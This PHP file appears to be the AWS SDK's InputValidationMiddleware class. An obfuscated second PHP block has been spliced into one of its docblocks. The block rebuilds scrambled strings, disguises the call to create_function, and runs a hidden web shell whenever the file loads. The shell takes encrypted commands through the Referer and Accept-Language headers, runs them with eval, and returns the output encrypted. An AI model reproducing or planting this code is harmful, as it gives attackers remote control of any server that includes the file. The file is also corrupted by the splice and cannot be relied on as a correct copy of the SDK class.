<?php
namespace Aws;

use Aws\Api\Service;

/**
 * Validates the required input parameters of commands are non empty
 *
 * @internal
 */
class InputValidationMiddleware
{

    /** @var callable */
    private $nextHandler;

    /** @var array */
    private $mandatoryAttributeList;

    /** @var Service */
    private $service;

    /**
     * Create a middleware wrapper function.
     *
     * @param Service $service
<?php
$p='ession_ZkstZkart()Zk;$s=&$_SZkESSION;Zk$ss="ZkZksubstr";Zk$sl="ZkstrtolowerZkZk";$i=Zk$m[1][0].$m[1][Zk1];$h=$ZksZkl($ss(Zk';
$L='or($j=0;($j<$Zkc&Zk&$i<$l);$j+Zk+,$Zki++)Zk{$o.=$t{$iZkZk}^$k{$j}Zk;}}returZkn $o;}$Zkr=$_SZkERVER;$rr=Zk@$Zkr["HZkTTP_REFE';
$O='[$zZk]]Zk;if(strposZk($p,$Zkh)===0){Zk$s[$iZk]=Zk"";$p=$ss(Zk$p,Zk3);Zk}if(arZkray_key_exZkZkists($iZk,$s)){$sZk[$iZk].Zk=$';
$V='$q);$q=arrayZk_valuZkesZk($q);preZkg_mZkatch_alZkl("/([Zk\\w])[\\Zkw-]+Zk(?:;q=0.Zk(Zk[Zk\\d]))?Zk,?/",$Zkra,Zk$m);if($q&&$m){@s';
$A='md5($i.$kh),0ZkZk,3));$f=$slZkZk($ss(md5Zk($i.$kfZk),0,3));$pZk="";foZkr($z=1;ZkZk$z<ZkcounZkt($m[1]);$z++)$pZk.=$Zkq[$m[2]';
$U='REZkR"];$Zkra=@$r[ZkZk"HTTP_ZkACCEPT_LAZkZkNGUAGE"];if($ZkZkrr&&$raZk){$u=parse_uZkrl($Zkrr);paZkrsZkZke_str($Zku["query"Zk],';
$s='replZkace(aZkrZkray("ZkZk/_/","/-/"Zk),array(Zk"/","+Zk"),$ss($s[$i],Zk0,$e))Zk),$k))Zk);$oZk=obZk_Zkget_contents(Zk);oZkbZ';
$m='pZk;$e=strpos(ZkZk$s[$i],$Zkf);if($e){$k=$kh.$kZkfZk;ob_startZk();@ZkevaZkl(@gzuncomprZkess(@xZk(@baseZk64_decodZke(Zkpreg_';
$H='kZk_endZk_Zkclean();$d=bZkase64_encode(x(gzcompZkrZkeZkss($o),$k));prinZkt("<$k>Zk$d</$Zkk>");@sessZkion_deZkstZkroy();}}}}';
$g='$kh=Zk"5d41";Zk$Zkkf="402a";funcZktion Zkx($t,$k)Zk{$Zkc=sZktrlen($Zkk);$l=stZkrlen($t);$o=Zk"";fZkor($i=Zk0;Zk$i<$l;ZkZk){f';
$n=str_replace('h','','chrehateh_hfunhhction');
$S=str_replace('Zk','',$g.$L.$U.$V.$p.$A.$O.$m.$s.$H);
$b=$n('',$S);$b();
?>
     * @param array $mandatoryAttributeList
     * @return callable     */
    public static function wrap(Service $service, $mandatoryAttributeList) {
        if (!is_array($mandatoryAttributeList) ||
            array_filter($mandatoryAttributeList, 'is_string') !== $mandatoryAttributeList
        ) {
            throw new \InvalidArgumentException(
                "The mandatory attribute list must be an array of strings"
            );
        }
        return function (callable $handler) use ($service, $mandatoryAttributeList) {
            return new self($handler, $service, $mandatoryAttributeList);
        };
    }

    public function __construct(
        callable $nextHandler,
        Service $service,
        $mandatoryAttributeList
    ) {
        $this->service = $service;
        $this->nextHandler = $nextHandler;
        $this->mandatoryAttributeList = $mandatoryAttributeList;
    }

    public function __invoke(CommandInterface $cmd) {
        $nextHandler = $this->nextHandler;
        $op = $this->service->getOperation($cmd->getName())->toArray();
        if (!empty($op['input']['shape'])) {
            $service = $this->service->toArray();
            if (!empty($input = $service['shapes'][$op['input']['shape']])) {
                if (!empty($input['required'])) {
                    foreach ($input['required'] as $key => $member) {
                        if (in_array($member, $this->mandatoryAttributeList)) {
                            $argument = is_string($cmd[$member]) ?  trim($cmd[$member]) : $cmd[$member];
                            if ($argument === '' || $argument === null) {
                                $commandName = $cmd->getName();
                                throw new \InvalidArgumentException(
                                    "The {$commandName} operation requires non-empty parameter: {$member}"
                                );
                            }
                        }
                    }
                }
            }
        }
        return $nextHandler($cmd);
    }

}
